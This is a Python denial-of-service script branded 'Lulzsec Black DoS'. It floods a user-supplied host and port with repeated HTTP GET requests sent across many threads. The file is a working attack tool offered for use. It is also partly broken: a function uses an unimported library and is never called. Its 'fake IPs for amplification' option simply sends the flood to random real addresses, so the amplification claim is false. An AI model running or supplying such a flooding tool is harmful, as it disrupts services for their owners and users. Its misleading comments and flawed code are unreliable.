import socket
import random
import threading
import pyfiglet
from colorama import init, Fore, Style
import time

# Initialize colorama
init()

# List of fake IP addresses for amplification attack
fake_ips = [
    "192.19.12.1",
    "182.19.41.2",
    "196.15.91.4",
    "191.190.1.3",
    "193.161.5.1",
    # Add more fake IPs here if needed
]

# List of additional data for the attack
additional_data = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Encoding: gzip, deflate, br",
    "Accept-Language: en-US,en;q=0.5",
    "Connection: keep-alive",
    "Upgrade-Insecure-Requests: 1",
]

# List of common user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    # Add more user agents here if needed
]

# Function to check if target is protected
def check_protection(target_url):
    try:
        response = requests.get(target_url)
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] Target {target_url} is reachable and vulnerable.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Target {target_url} responded with status code {response.status_code}. It might be protected.{Style.RESET_ALL}")
        return response.status_code == 200
    except Exception as e:
        print(f"{Fore.RED}[-] Error checking target {target_url}: {e}{Style.RESET_ALL}")
        return False

# Function for DoS attack
def dos_attack(target_ip, target_port, num_requests):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, target_port))
        
        # Prepare HTTP request
        request = b"GET / HTTP/1.1\r\n"
        request += b"Host: " + target_ip.encode() + b"\r\n"
        request += b"User-Agent: " + random.choice(user_agents).encode() + b"\r\n"
        
        # Add additional data
        for data in additional_data:
            request += data.encode() + b"\r\n"
        
        request += b"\r\n"
        
        # Send multiple requests
        for _ in range(num_requests):
            client.send(request)
        
        print(f"{Fore.GREEN}[+] Sent {num_requests} packets to {target_ip} through port {target_port}{Style.RESET_ALL}")
        
        # Receive response (optional)
        # response = client.recv(4096)
        # print(f"Response: {response.decode()}")
        
        client.close()
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

# Function for launching DoS attack with multiple threads and fake IPs
def launch_dos_attack(target_ip, target_port, num_threads, num_requests_per_thread, use_fake_ips=False):
    threads = []
    for i in range(num_threads):
        if use_fake_ips:
            ip = random.choice(fake_ips)
        else:
            ip = target_ip
        
        thread = threading.Thread(target=dos_attack, args=(ip, target_port, num_requests_per_thread))
        thread.start()
        threads.append(thread)
        time.sleep(0.01)  # Small delay to spread out thread starts
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    ascii_banner = pyfiglet.figlet_format("Lulzsec Black DOS")
    print(f"{Fore.RED}{ascii_banner}{Style.RESET_ALL}")

    print(f"{Fore.YELLOW}Welcome to Lulzsec Black DoS Attack Script{Style.RESET_ALL}")

    target_url = input(f"{Fore.CYAN}Enter target URL (e.g., http://example.com): {Style.RESET_ALL}")
    target_ip = socket.gethostbyname(target_url.split('//')[1].split('/')[0])
    target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))
    num_threads = int(input(f"{Fore.CYAN}Enter number of threads: {Style.RESET_ALL}"))
    num_requests_per_thread = int(input(f"{Fore.CYAN}Enter number of requests per thread: {Style.RESET_ALL}"))
    use_fake_ips = input(f"{Fore.CYAN}Use fake IPs for attack? (y/n): {Style.RESET_ALL}").lower() == 'y'

    print(f"{Fore.YELLOW}Launching DoS attack on {target_ip}:{target_port} with {num_threads} threads and {num_requests_per_thread} requests per thread...{Style.RESET_ALL}")
    launch_dos_attack(target_ip, target_port, num_threads, num_requests_per_thread, use_fake_ips)